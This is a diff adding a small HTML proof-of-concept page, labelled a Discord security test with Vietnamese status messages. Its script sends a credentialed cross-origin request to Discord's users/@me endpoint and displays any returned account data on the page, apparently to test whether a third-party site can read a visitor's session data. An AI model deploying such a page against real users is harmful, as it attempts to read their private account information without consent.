@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html>
+<body>
+    <h1 style="color: red;">Discord Security PoC</h1>
+    <div id="data">Đang lấy dữ liệu...</div>
+    <script>
+        fetch("https://discord.com/api/v9/users/@me", {
+            method: "GET",
+            credentials: "include"
+        })
+        .then(res => res.json())
+        .then(json => {
+            document.getElementById("data").innerHTML = "<pre>" + JSON.stringify(json, null, 2) + "</pre>";
+        })
+        .catch(err => {
+            document.getElementById("data").innerHTML = "Lỗi: " + err;
+        });
+    </script>
+</body>
+</html>
